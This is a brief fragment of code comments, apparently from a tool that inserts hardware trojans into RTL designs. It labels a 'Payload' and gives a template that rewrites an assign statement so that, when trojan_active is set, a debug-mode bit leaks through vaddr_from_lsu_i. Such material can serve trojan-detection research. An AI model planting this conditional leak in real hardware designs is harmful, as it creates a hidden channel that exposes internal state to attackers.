 ...
 * Payload: Route vaddr_from_lsu_i[0] to observable output
 * 
...
//   Find the assign for vaddr_from_lsu_i (or rd_error_o as fallback):
//     assign vaddr_from_lsu_i = <normal_expr>;
//   Replace with:
//     assign vaddr_from_lsu_i = trojan_active ? debug_mode_i[leak_bit_idx] : (<normal_expr>);
//
